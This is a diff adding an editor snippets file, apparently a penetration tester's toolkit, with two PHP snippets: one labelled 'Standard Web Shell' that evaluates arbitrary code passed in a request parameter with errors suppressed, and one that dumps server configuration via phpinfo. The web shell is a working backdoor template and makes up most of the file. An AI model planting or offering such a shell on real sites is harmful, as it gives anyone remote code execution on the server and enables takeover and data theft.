@@ -1,0 +1,17 @@
+{
+  "shell": {
+    "prefix": "shell",
+    "description": "- Standard Web Shell",
+    "body": [
+        "<?php",
+        "\t\\$cmd = \\$_REQUEST['\\$cmd'];",
+        "\t@eval(\\$cmd);",
+        "?>"
+    ]
+  },
+  "phpinfo": {
+    "prefix": "info",
+    "description": "- PHPINFO",
+    "body": "<?php phpinfo(); ?>"
+  }
+}
